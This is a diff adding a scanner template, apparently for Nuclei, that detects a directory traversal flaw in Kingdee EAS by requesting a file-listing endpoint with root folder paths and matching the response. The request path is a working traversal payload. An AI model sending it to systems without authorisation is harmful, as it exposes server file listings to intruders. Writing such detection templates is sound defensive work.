@@ -1,0 +1,28 @@
+id: kingdee-eas-directory-traversal
+info:
+  name: Kingdee EAS Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+
+variables:
+  r_path:
+    - "/"
+    - "C://"
+
+http:
+  - method: GET
+    path:
+      - "/appmonitor/protected/selector/server_file/files?folder={{r_path}}&suffix="
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{\"total\":0,\"rows\":"
+      - type: word
+        part: body
+        words:
+          - "folder"
+        negative: true
